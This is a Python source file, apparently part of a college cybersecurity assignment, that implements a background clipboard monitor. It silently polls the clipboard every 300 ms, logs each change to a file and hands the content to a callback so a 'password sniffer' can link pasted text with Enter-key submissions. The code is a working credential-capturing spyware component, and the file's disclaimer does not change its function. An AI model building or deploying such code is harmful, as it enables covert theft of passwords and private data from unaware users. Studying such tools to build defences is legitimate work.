"""
clipboard_monitor.py â€” Background clipboard watcher.

Polls the system clipboard every 300 ms.  When content changes, logs it to
clipboard_log.txt and invokes an optional callback so the password sniffer
can correlate clipboard pastes with Enter-key submissions.

College cybersecurity assignment â€” run only on systems you own.
"""

import threading
import time
from datetime import datetime

try:
    import pyperclip
    _PYPERCLIP = True
except ImportError:
    _PYPERCLIP = False

import config


def _ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


class ClipboardMonitor(threading.Thread):
    """Daemon thread that watches the clipboard for changes."""

    def __init__(self, callback=None):
        super().__init__(daemon=True, name="ClipboardMonitor")
        self._running      = False
        self._last         = ""
        self._callback     = callback   # callable(event_type: str, content: str)
        self._log          = config.CLIPBOARD_FILE

    # â”€â”€ Thread entry â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    def run(self) -> None:
        if not _PYPERCLIP:
            return

        self._running = True
        self._write_header()

        # Seed with current content so the first real change is captured
        try:
            self._last = pyperclip.paste() or ""
        except Exception:
            self._last = ""

        while self._running:
            try:
                current = pyperclip.paste() or ""
                if current and current != self._last:
                    self._on_change(current)
                    self._last = current
            except Exception:
                pass
            time.sleep(0.3)

    def stop(self) -> None:
        self._running = False

    # â”€â”€ Properties â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    @property
    def last_content(self) -> str:
        return self._last

    # â”€â”€ Internal â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    def _on_change(self, content: str) -> None:
        ts      = _ts()
        snippet = content[:200]   # cap at 200 chars for the log
        line    = f"[{ts}] CLIPBOARD CHANGED: {snippet}"

        try:
            with open(self._log, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except OSError:
            pass

        if self._callback:
            try:
                self._callback("clipboard", content)
            except Exception:
                pass

    def _write_header(self) -> None:
        try:
            with open(self._log, "a", encoding="utf-8") as f:
                f.write(f"\n--- Clipboard Monitor started: {_ts()} ---\n")
        except OSError:
            pass

